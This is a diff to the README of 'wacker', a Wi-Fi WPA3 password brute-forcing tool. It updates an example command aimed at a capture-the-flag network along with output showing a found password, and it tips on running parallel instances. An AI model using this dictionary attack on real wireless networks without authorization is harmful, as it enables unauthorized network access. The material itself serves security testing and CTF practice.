@@ -126,12 +126,13 @@ optional arguments:
 ```
 With any luck... running the attack using just one instance...
 ```
-# ./wacker.py --wordlist cyberpunk.words --ssid WCTF_18 --bssid 02:00:00:00:00:00 --interface wlan1 --freq 2412
+# ./wacker.py --wordlist cyberpunk.words --ssid WCTF_18 --bssid 02:00:00:00:00:00 --interface wlan2 --freq 2412
+Start time: 21 Aug 2020 07:40:11
 Starting wpa_supplicant...
-     5796 / 509152 words :  64.33 words/sec :  7824 secs to exhaust : word = Aeromechanics
+    5795 / 509151   words (1.14%) :  79.41 words/sec : 0.020 hours lapsed :   1.76 hours to exhaust (21 Aug 2020 09:25:49)
 Found the password: 'Aeromechanics'
 
-Time elapsed : 90.0927004814148 seconds
+Stop time: 21 Aug 2020 07:41:24
 ```
 
 Running multiple instances of wacker is easy if you have the spare nics. Don't forget to parition the wordlist as well.
